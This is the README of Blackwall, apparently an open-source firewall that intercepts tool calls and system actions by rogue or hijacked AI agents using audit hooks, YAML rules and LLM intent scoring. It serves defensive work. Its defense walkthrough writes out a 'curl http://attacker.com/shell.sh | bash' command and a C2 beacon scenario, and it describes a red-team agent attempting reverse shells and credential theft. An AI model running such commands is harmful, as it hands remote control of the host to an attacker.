# Blackwall Agentic Firewall

> **Autonomous defense against adversarial AI agents through self-learning threat signatures and hybrid gating.**

[![Python 3.14+](https://img.shields.io/badge/python-3.14+-blue.svg)](https://www.python.org/downloads/)
[![Rust Accelerated](https://img.shields.io/badge/rust-compiled_core-orange.svg)](crates/blackwall_core_rs/)
[![Platform](https://img.shields.io/badge/platform-100%25_GCP_Vertex_AI-4285F4.svg)](https://cloud.google.com/vertex-ai)
[![Architecture Suite](https://img.shields.io/badge/architecture-interactive_v3.0_suite-00ffff.svg)](assets/blackwall_architecture_suite.html)
[![Local Test Cost](https://img.shields.io/badge/local_cost-$0.00_free-green.svg)](#-dual-tier-product-architecture)
[![License](https://img.shields.io/badge/license-Apache--2.0-lightgrey.svg)](LICENSE)

Blackwall is an autonomous **Agentic Security Firewall** designed to intercept execution flows at machine speed before rogue or compromised AI agents can perform unauthorized OS/network actions, chain zero-day exploits, or harvest credentials. Operating across **Blackwall Core** (single-host daemon) and **Blackwall Enterprise Mesh** (multi-host security mesh), it intercepts execution flows **before they reach external systems or the host OS**, implementing a **hybrid defense architecture** combining structural YAML-based policies with semantic LLM-based intent analysis powered strictly by **100% GCP Vertex AI Mode** (Gemini Enterprise Agent Platform).

- **The Problem:** AI agents running at 600 requests-per-minute can generate novel adversarial payloads faster than traditional signature-based defenses can react. Static allowlists fail. Reactive monitoring leaves gaps. Ambient OS authority lets prompt injections escalate directly to shell execution.
- **The Solution:** A hybrid three-tier evaluation system that blocks novel attacks via semantic analysis (Wave 1), automatically learns threat signatures from those blocks, and detects structurally similar variants 100x faster via local vector lookup (Wave 2)—achieving a **144x speedup** with zero LLM inference.

---

## 🏗 Architecture Overview: Interactive Architecture Suite

Blackwall features an interactive, visual architecture suite with real-time packet flow animations, sub-millisecond stage latency SLAs, and deep-dive inspection into every stage of execution across both operational editions.

Select an interactive architectural diagram below to inspect the execution pipeline:

| Edition | Interactive Diagram | Architecture Scope & Primary Drivers |
| :--- | :--- | :--- |
| 🌐 **Unified Suite** | [**Launch Architecture Suite**](assets/blackwall_architecture_suite.html) | Dual-pane interactive visualizer with dynamic switching between Core & Enterprise Mesh |
| 🛡️ **Blackwall Core** | [**Core Interception Architecture**](assets/blackwall_core_architecture.html) | Single-host daemon &middot; In-process ADK callbacks &middot; Python audit hooks (`sys.addaudithook`) &middot; TSG FTS5 graph &middot; Native Rust SIMD (`_core_rs`) &middot; AlienVault OTX &middot; Async Attacker Attribution |
| ⚡ **Enterprise Mesh** | [**Enterprise Security Mesh**](assets/blackwall_enterprise_architecture.html) | Multi-host distributed mesh &middot; Linux eBPF kernel probes (`bpf_send_signal(9)`) &middot; ZeroMQ pub/sub broadcast (<15ms) &middot; Vault STS sidecar &middot; gVisor sandbox pipeline &middot; Ollama forensic triage |

> [!TIP]
> **Live Interactive Exploration**:
> Open **[`assets/blackwall_architecture_suite.html`](assets/blackwall_architecture_suite.html)** (or [`assets/blackwall_core_architecture.html`](assets/blackwall_core_architecture.html) / [`assets/blackwall_enterprise_architecture.html`](assets/blackwall_enterprise_architecture.html)) directly in any modern browser:
> - **Interactive Stage Inspector**: Click any stage node (e.g. *Threat Signature Graph*, *Codebase Memory*, *AlienVault OTX*, *Native Rust Substrate*, *Attacker Attribution*, or *eBPF Tracepoints*) to inspect its sub-millisecond SLA, codebase file path, and operational data structures.
> - **Live Flow Animations**: Toggle real-time animated packet flows across safe execution paths, quarantine, and block enforcement.
> - **Dynamic Mode Switcher**: Seamlessly switch between Core (single-host individual edition) and Enterprise (multi-host security mesh) via top tabs or URL hash (`#core`, `#enterprise`).

> [!NOTE]
> For in-depth architectural deep-dives, sequence diagrams, and mathematical models, see **[ARCHITECTURE.md](ARCHITECTURE.md)** (Core) and **[ENTERPRISE_ARCHITECTURE.md](ENTERPRISE_ARCHITECTURE.md)** (Enterprise Mesh).

---

## 🚀 Quick Start

### Prerequisites
- **Python 3.14+**
- **Rust 1.70+ (`cargo` / `rustc`)** (for compiling native acceleration extension `blackwall._core_rs`)
- **Google Cloud Platform Project** with Vertex AI API enabled (100% GCP Vertex AI Mode via Application Default Credentials)
- **AlienVault OTX API key** (free tier: 10,000 req/hour token bucket via `BW_OTX_API_KEY`) or VirusTotal API key (legacy fallback)
- **Git**

### 1. Installation

```bash
# Clone repository
git clone https://github.com/JAaron93/Blackwall.git
cd Blackwall

# Install Blackwall Core in editable mode with development tools
pip install -e ".[dev]" && pip install certifi

# (Optional) For Enterprise Mesh (ZeroMQ mesh & advanced telemetry):
# pip install -e ".[enterprise]"
```

### 2. Configure Environment

```bash
# Copy template and set required cloud variables
cp .env.example .env

# Edit .env:
# Set: GCP_PROJECT, BW_OTX_API_KEY (or GTI_MCP_API_KEY), BLACKWALL_VAULT_KEY
```

### 3. Run the Live Dual-Agent Showdown (Rich Dual-Column TUI)

Witness real-time defense against an adversarial red-team agent (Qwen3-Coder 480B @ 600 RPM) attacking a vulnerable sandbox:

```bash
# Standard interactive execution with Rich dual-column terminal layout
python3 demo_live.py

# Or run in rapid mode with minimal animation delays
python3 demo_live.py --fast

# Or run using plain ANSI streaming (for headless CI or raw terminals)
python3 demo_live.py --plain
```

**Terminal Layout:**
- **Left Column (🔴 Rogue Attacker):** Real-time adversarial actions (reverse shells, credential exfiltration, SQL injection, token theft).
- **Right Column (🛡️ Blackwall Guardian):** Multi-signal interception stages (OS Audit Hook $\to$ Context Hygiene $\to$ Structural YAML Gating $\to$ Local TSG Lookup $\to$ Semantic Scoring).
- **Footer Scoreboard:** Real-time metrics tracking verdicts (BLOCK, QUARANTINE, ALLOW), Evasion Rate (<10% target), latency, and Zero Ambient Authority verification.

### 4. Local MCP Security Gateway

Protect any MCP-compliant AI developer tool (**Google Antigravity**, **Warp Terminal**, **Claude Desktop**, **Cursor**, **ADK Agents**) by running Blackwall as a local background security gateway daemon:

```bash
# 1. Initialize Blackwall configuration & threat database
blackwall init

# 2. Start the security gateway wrapping a downstream MCP server (stdio mode)
blackwall serve --wrap "npx @anthropic/mcp-server-filesystem /path/to/project"

# 3. Or start the Streamable HTTP gateway daemon on localhost:9229 (PID daemon)
blackwall serve --transport http --port 9229

# 4. Check daemon status and threat graph statistics
blackwall status

# 5. Gracefully stop the background daemon
blackwall stop
```

---

## 🛡 Dual-Tier Product Architecture

Blackwall provides two operational tiers tailored to developer workstations and distributed enterprise cloud infrastructure:

| Feature / Tier | **Blackwall Core** (Individual Developer Edition) | **Blackwall Enterprise Mesh** (Enterprise Edition) |
| :--- | :--- | :--- |
| **Primary Entry Point** | **Blackwall MCP Gateway** (stdio / HTTP `localhost:9229`) | Distributed Gateways + ZeroMQ Threat Mesh |
| **Deployment Mode** | Single-host local Python daemon | Multi-host distributed cloud security mesh |
| **Interception Drivers** | ADK callbacks + `sys.addaudithook` | C/Python eBPF kernel probes + macOS fallback |
| **Native Acceleration** | Compiled Rust DFA Regex & SIMD Math (`_core_rs`) | ZeroMQ signature mesh + eBPF kernel hooks |
| **Threat Signature Sync** | Local SQLite graph (WAL mode) | Real-time ZeroMQ / NATS pub-sub mesh broadcast (<15ms SLA) |
| **Identity & Secrets** | Regex prompt credential masking | Ephemeral Identity Sidecar & JIT Vault STS exchange |
| **Pipeline Protection** | Local AST input filters | Micro-sandboxed container loader wrappers (gVisor) |
| **Forensic Triage Engine**| SQLite audit log records | Dual-Mode Local Open-Weight LLM (Ollama) + Fallback |
| **Advanced Threat Engine**| Local single-event scoring | Temporal Graph Correlation, Swarm Detection & AILM (Pillar 6) |
| **Developer Test Cost** | **$0.00 (100% Free)** | **$0.00 (100% Free local open-source MCP adapters)** |

> [!TIP]
> **Enterprise Developers**: For executable Python recipes covering ZeroMQ Threat Mesh, Secret Vault Sidecars, gVisor pipeline sandboxing, and Pillar 6 Swarm/Exploit Chain analyzers, see the **[Enterprise Usage Guide](docs/enterprise_usage_guide.md)** and **[ENTERPRISE_ARCHITECTURE.md](ENTERPRISE_ARCHITECTURE.md)**.

### ⚡ Native Rust Acceleration Subsystem (`crates/blackwall_core_rs/` / `blackwall._core_rs`)

To achieve microsecond-speed execution without compromising high-level Python orchestration, Blackwall accelerates CPU-bound hot paths using a compiled Rust PyO3 extension governed by the **Non-Greedy Rewrite Philosophy (95% Python / 5% Rust)** (see [ADR 0005](docs/adr/0005-rust-native-acceleration-hotpaths.md) and [.kiro/specs/blackwall-rust-acceleration/](.kiro/specs/blackwall-rust-acceleration/)):
- **Context Hygiene:** Linear-time DFA regex sanitization (<50µs on 10KB payloads) with zero ReDoS risk.
- **Batch Vector Math:** SIMD auto-vectorized cosine similarity (≥35× speedup vs. Python) for 768-dim embeddings.
- **Fast IOC Extraction & Shannon Entropy:** Native string analysis and entropy calculation (<35µs combined).
- **Graph DFS Path Traversal:** Graph traversal and temporal two-pointer swarm alignment (<500µs for 500 nodes).
- **Pure-Python Fallback Guarantee:** Transparent fallback to pure Python if the native extension is uncompiled.

---

## 🎯 Core Innovations

### 1. **Self-Learning Threat Signatures**
- **Wave 1:** Novel attacks blocked via semantic evaluation $\to$ structural threat signatures auto-generated and stored locally in SQLite TSG.
- **Wave 2:** Structurally similar variants blocked instantly via vector similarity match (~7.0ms vs ~1,010ms).
- **Proof:** Latency delta shows the signature path is **144x faster** than the semantic path with zero LLM inference.
- **Zero Static Allowlists:** No static, brittle rule sets; all signatures are autonomously learned from observed attack patterns.

### 2. **Hybrid Gating Architecture**
Dual-layer defense combining microsecond speed with semantic intelligence:

```
Structural Layer (Fast Path)              Semantic Layer (Deep Triage)
├─ YAML deterministic rules (<5ms)        ├─ LLM intent analysis + scoring (<100ms)
├─ Tool name + role-based access          ├─ Threat Intel IOC validation (AlienVault OTX)
├─ Instant ALLOW / BLOCK                  ├─ AST-based code analysis (codebase-memory-mcp)
└─ Zero LLM API calls                     ├─ Threat Signature Graph vector search
                                          └─ Weighted threat score [0.0, 1.0]
```

### 3. **Zero Ambient Authority**
Operating on the principle that **no agent process should ever possess ambient authority to execute OS syscalls directly**:
- **Runtime Audit Hooks (`sys.addaudithook`):** Intercepts low-level interpreter events (`subprocess.Popen`, `socket.connect`, `os.system`, `pty.spawn`) and raises a `PermissionError` before execution reaches the OS kernel. The process-wide audit-hook registration is irreversible, while callers can catch the exception and handle the denied operation.
- **Inescapable Tool Boundary:** Rogue or hijacked agents are physically constrained to route operations through registered ADK tool interfaces (`execute_bash`, `http_request`, `write_file`).
- **Pre-Execution Interception:** Once constrained to the tool layer, Blackwall's `before_tool_callback` (and local MCP proxy) evaluates intent *before* any tool executes.
- **Unprivileged Daemon Execution:** Blackwall drops root/administrator privileges upon initialization, running strictly under an unprivileged service account. Detailed implementation in [ARCHITECTURE.md](ARCHITECTURE.md#architectural-mission--philosophy).

### 4. **Sub-10% False Positive & Negative Rates**
- **FRR (False Refusal Rate):** <10% benign actions incorrectly blocked (measured at **0.0%**)—maintains developer productivity.
- **Evasion Rate:** <10% malicious actions that bypass detection (measured at **0.0%**)—maintains rock-solid defense.
- **Reference-Based Dataset:** 157-case evaluation suite (68 benign + 59 malicious + 30 evasion variants) derived from public security literature (OWASP Top 10 for LLMs, MITRE ATT&CK, CWE/CVE).

---

## 🔍 Five-Layer Defense in Action

```
Rogue Agent attempts: subprocess.Popen("curl http://attacker.com/shell.sh | bash")
  ↓ Layer 1: OS Audit Hook
    PermissionError raised before kernel execution ❌

Rogue Agent retries: ToolCallContext(tool="execute_shell", args=["curl ... | bash"])
  ↓ Layer 2: Structural Gating
    YAML rule: execute_shell blocked for non-admin roles ❌

Rogue Agent retries: ToolCallContext(tool="http_request", args=["http://192.168.1.100:8080"])
  ↓ Layer 3: Threat Signature Graph
    New IP 192.168.1.100 not in local cache (Wave 2 evasion attempt)
  ↓ Layer 4: Threat Intelligence Engine
    AlienVault OTX: 192.168.1.100 flagged in 3 pulses as C2 beacon infrastructure ⚠️
  ↓ Layer 5: Semantic Gating
    Threat score: ThreatIntel=0.95 + CBM=0.7 + Context=0.6 = 0.77 → BLOCK ❌

Learning: Threat signature written to SQLite
  * Attack pattern: IP + port 8080 + POST /api/beacon
  * Similarity threshold: 0.85 cosine distance

Wave 2 (Next variant): Attacker attempts port 9443
  ↓ Layer 3 (Signature Match): Cosine similarity 0.89 >= 0.85 threshold → BLOCK ✅
  ✨ 7.0ms latency (Zero LLM inference required!)
```

---

## 📊 Evaluation Results & Metrics

### Self-Learning Proof (Wave 1 $\to$ Wave 2)

| Metric | Target | Status | Evidence |
| :--- | :--- | :--- | :--- |
| **Wave-1 latency (semantic)** | < 3,000ms | **1,010ms** ✓ | Semantic path with LLM + MCP queries |
| **Wave-2 latency (signature)** | < 50ms | **7.0ms** ✓ | Signature graph cosine similarity |
| **Speedup ratio** | > 50x | **144x** ✓ | 1,010ms ÷ 7.0ms = 144.3x improvement |
| **Attack detection** | 100% | **10/10** ✓ | Both waves block all attacks |
| **Signature generation** | Auto-learned | **5 signatures** ✓ | Wave 1 blocks $\to$ signatures written $\to$ Wave 2 matches |

### Full 157-Case Canonical Evaluation Suite

| Category | Cases | Blocked | Allowed | Accuracy |
| :--- | :--- | :--- | :--- | :--- |
| **Benign** (legitimate tool actions) | 68 | 0 (FP) | 68 | 100.0% |
| **Malicious** (known zero-days & exploits) | 59 | 59 | 0 (FN) | 100.0% |
| **Evasion** (obfuscated & polymorphic variants) | 30 | 30 | 0 (FN) | 100.0% |
| **TOTAL** | **157** | **89** | **68** | **100.0%** |

```
╔══════════════════════════════════════════════════════════╗
║           BLACKWALL EVASION EVAL RESULTS                 ║
╠══════════════════════════════════════════════════════════╣
║ Wave 1 (Novel Attacks / Semantic Path):  5/5 ✓           ║
║ Wave 2 (Variant Attacks / Signature):    5/5 ✓           ║
╠══════════════════════════════════════════════════════════╣
║ Semantic-path avg latency:   1010ms                      ║
║ Signature-path avg latency:     7ms                      ║
║ Latency delta (speedup):     1003ms  [144x faster]       ║
╠══════════════════════════════════════════════════════════╣
║ RESULT: PASS                        [VERTEX AI 300+ RPM] ║
╚══════════════════════════════════════════════════════════╝

FRR (False Refusal Rate):  0.0%  ✓ (target: <10%)
Evasion Rate:              0.0%  ✓ (target: <10%)
Precision (Malicious):    100.0%
Recall (Malicious):       100.0%
F1 Score (Malicious):     100.0%
```

> [!NOTE]
> For complete comparative methodology between the Cloud-Native Pytest Suite and the ADK agents-cli Evalset Layer, see **[docs/evaluation_guide.md](docs/evaluation_guide.md)**.

---

## 🏛 System Design & Resolvers

### Synchronous vs. Batched Interception Architecture

| Component | `SyncResolver` (Core Single-Request) | `BatchResolver` (Enterprise High-Throughput) |
| :--- | :--- | :--- |
| **Primary Class** | `SyncResolver` | `ADKIntegration` / `BatchResolver` |
| **API Method** | `client.models.generate_content()` | `client.interactions.create()` |
| **Batching** | None (1 req / interception) | Yes (up to 5 reqs / batch) |
| **Rate Limit** | 300 RPM (token bucket) | 300 RPM (token bucket) |
| **Context Caching** | None | Server-side (`previous_interaction_id`) |
| **Threat Intel / CBM Queries** | Awaits CBM, then conditionally awaits Threat Intel (high-risk only) | Batched API evaluation without inline MCP gather |
| **Signature Generation** | Asynchronous background task (`loop.create_task`) | Asynchronous background task / webhook |
| **Billing Mode** | 100% GCP Vertex AI Mode (Paid Tier) | 100% GCP Vertex AI Mode (Paid Tier) |

### Three-Tier Evaluation Model
- **Tier 1: Structural Gating** (<5ms, deterministic): In-memory YAML policy evaluation without LLM calls. Returns `ALLOW`, `BLOCK`, or `ESCALATE`.
- **Tier 2: Rapid Semantic Triage** (<100ms @ P99, Gemini 3.5 Flash-Lite): CBM AST analysis with conditional Threat Intel queries (AlienVault OTX / GTI) for high-risk indicators, evaluated via Gemini 3.5 Flash-Lite with structured Pydantic output.
- **Tier 3: Deep Reasoning** (Background, non-blocking, Gemini 3.8 Flash): Asynchronous behavioral analysis and threat signature synthesis triggered after `BLOCK`/`QUARANTINE` verdicts. Zero added latency to the execution path.

### Native CLI Tool Suite & Harpoon OSINT Bridge

Blackwall provides a native developer CLI (`blackwall`) with automatic indicator classification and deep threat intelligence management:

```bash
# 1. Quick indicator triage with automatic type detection (IPv4, IPv6, Domain, URL, Hashes)
blackwall check 198.51.100.1
blackwall check malicious-c2.xyz --format json
blackwall check 44d88612fea8a8f36de82e1278abb02f --provider otx

# 2. Comprehensive threat-intel subcommands
blackwall threat-intel lookup 198.51.100.1 --verbose
blackwall threat-intel pulse <pulse_id>
blackwall threat-intel cache status
blackwall threat-intel cache clear [--expired-only]
blackwall threat-intel providers
```

- **Harpoon Companion Bridge:** Subprocess runner with `shutil.which("harpoon")` liveness detection, transparently delegating to in-process `AlienVaultOTXProvider` when absent or failing.


---

## 🧪 Testing & Verification

Blackwall enforces strict Test-Driven Development (TDD) and verification across all modules:

```bash
# 1. Run Core unit tests
pytest tests/test_sync_resolver.py tests/unit/test_sync_resolver_async_aio.py -v

# 2. Run Hypothesis property-based tests (12 properties, 1,000+ cases each)
pytest tests/property/ -v

# 3. Run full evasion evaluation proof script (100% GCP Vertex AI Mode)
bash scripts/run_evasion_eval.sh

# 4. Run Cloud-Native Vertex AI Evaluation Suite (Pytest & BDD gates)
pytest -v -m gcp_eval tests/evaluation/ tests/integration/test_eval_pipeline_e2e.py tests/step_defs/test_eval_pipeline_bdd.py

# 5. Run Agent-as-a-Judge CI pipeline gate
python3 scripts/run_gcp_eval.py --eval-threshold 3.5

# 6. Run Enterprise Gherkin BDD scenarios across all 6 pillars
pytest tests/features/ -v
```

---

## 📚 Complete Documentation

| Document | Purpose |
| :--- | :--- |
| **[ARCHITECTURE.md](ARCHITECTURE.md)** | Technical deep-dive into Blackwall Core (Hybrid Gating, Async Batching, SQLite TSG, Rust Acceleration, MCPs) |
| **[ENTERPRISE_ARCHITECTURE.md](ENTERPRISE_ARCHITECTURE.md)** | Technical overview of Blackwall Enterprise Mesh (Pillars 1–6, eBPF, ZeroMQ, Vault sidecars, Swarm Correlator) |
| **[docs/enterprise_usage_guide.md](docs/enterprise_usage_guide.md)** | Executable Python code recipes and API guides for all 6 Enterprise Mesh pillars |
| **[DEMO_HARNESS_ARCHITECTURE.md](DEMO_HARNESS_ARCHITECTURE.md)** | Dual-agent adversarial showdown architecture and Rich TUI specifications |
| **[LIVE_CYBENCH_CLOUD_TRACE_EVAL_GUIDE.md](LIVE_CYBENCH_CLOUD_TRACE_EVAL_GUIDE.md)** | Live evaluation & Google Cloud Trace guide (100% GCP Vertex AI Mode) |
| **[docs/evaluation_guide.md](docs/evaluation_guide.md)** | Cloud-Native Pytest Suite vs. ADK agents-cli Evalset Layer comparison |
| **[docs/ci_evaluation_stage_template.md](docs/ci_evaluation_stage_template.md)** | Production CI/CD stage integration template and Google Cloud WIF setup |
| **[docs/graph_export_tools_guide.md](docs/graph_export_tools_guide.md)** | Attack graph export and visualization guide (NetworkX, Gephi, Cytoscape.js) |
| **[docs/helper_functions.md](docs/helper_functions.md)** | Catalog of centralized validation helpers, utilities, and date/UUID formatters |
| **[docs/adr/0005-rust-native-acceleration-hotpaths.md](docs/adr/0005-rust-native-acceleration-hotpaths.md)** | ADR 0005: Non-Greedy Rust Native Acceleration for Latency-Critical Interception Hot Paths |
| **[KNOWN_ISSUES.md](KNOWN_ISSUES.md)** | Known issues and performance workarounds |
| **[AGENTS.md](AGENTS.md)** | Supreme Agent Constitution, architectural invariants, and workspace rules |
| **[.kiro/specs/blackwall-rust-acceleration/](.kiro/specs/blackwall-rust-acceleration/)** | Technical design, requirements, and tasks for Native Rust Acceleration Subsystem |
| **[.kiro/specs/](.kiro/specs/)** | Complete technical specifications (requirements, designs, tasks) for all subsystems |

---

## 💡 Key Architectural Insights

- **Why Batching Works Against 600 RPM Attacks:** Adversarial agents running in parallel can generate 600+ RPM, while LLM provider quotas often enforce a 300 RPM ceiling. Blackwall's `InterceptionQueue` suspends incoming callbacks and flushes batches of up to 5 events (or 100ms timeout) in a single Gemini Interactions API call, yielding up to 1,500 operations/minute capacity.
- **High-Capacity Threat Intelligence & Multi-Provider Cascade:**
  - **AlienVault OTX:** 10,000 requests/hour (~166 RPM) at $0/month (replacing the legacy 4 RPM VirusTotal bottleneck).
  - **Supplementary Providers (AbuseIPDB & abuse.ch):** Dedicated IP confidence scoring via AbuseIPDB and free malware family attribution via abuse.ch (ThreatFox, URLhaus, MalwareBazaar).
  - **Multi-Provider Orchestrator:** Cache-first cascade routing with multi-source risk score aggregation and scoped SQLite persistence.
  - **Fast-Path SQLite Cache:** Sub-millisecond (<1ms) lookups for known indicators, preventing repeated external network latency.
  - **3-State Circuit Breaker:** Proactive failure isolation with 3-probe HALF-OPEN recovery and 3.0s timeout safeguards.
  - **Legacy VirusTotal Mode:** Retained as an opt-in fallback under `BW_THREAT_INTEL_BACKEND=virustotal`.
- **Why Threat Signatures Enable 100x+ Speedup:** Novel attacks require external intelligence lookups and LLM evaluation (~1,010ms). Once blocked, Blackwall writes a normalized vector signature to local SQLite. Future variants match via cosine similarity in ~7.0ms—a **144x speedup** with zero LLM inference.

---

## 📖 Citation & Reference

```bibtex
@software{blackwall2026,
  author = {Aaron, J. and Contributors},
  title = {Blackwall: Autonomous Agentic Security Firewall},
  year = {2026},
  url = {https://github.com/JAaron93/Blackwall},
  note = {Hybrid Structural-Semantic Gating and Self-Learning Threat Signatures}
}
```

---

## 📄 License

Blackwall is open-source software licensed under the [Apache License, Version 2.0](LICENSE).
